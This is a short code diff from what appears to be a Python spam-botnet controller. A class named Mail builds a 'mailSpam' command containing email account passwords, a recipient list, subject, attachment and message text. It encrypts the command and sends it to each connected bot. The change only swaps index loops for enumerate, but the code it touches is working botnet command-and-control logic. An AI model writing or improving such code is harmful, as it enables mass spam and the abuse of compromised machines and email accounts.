@@ -28,14 +28,14 @@ class Mail:
 
             while len(self.connected) < len(self.mailAccounts):
                 self.gmailAccountGenerator()
-            for i in range(len(self.connected)):
+            for i, item in enumerate(self.connected):
                 for z in range(self.mailsPerBot):
                     self.mailsToSend = self.mailsToSend + self.mails[z] + " "
                 cmd = "%$mailSpam $mail: " + self.mailAccounts[c].split(":")[0] + " $password: " + self.mailAccounts[c].split(":")[1] + " $mailList: " + self.mailsToSend + " $subject: " + self.sub + " $filelength: " + str(len(self.file)) + " $filename: " + self.filename + " $text: " + self.msg
                 print(cmd)
-                self.connected[i].send(self.keys[i].encrypt(cmd.encode()))
+                item.send(self.keys[i].encrypt(cmd.encode()))
                 if(self.file):
-                    self.connected[i].send(self.file)
+                    item.send(self.file)
                 c+=1
         else:
             print("0 Bots online")
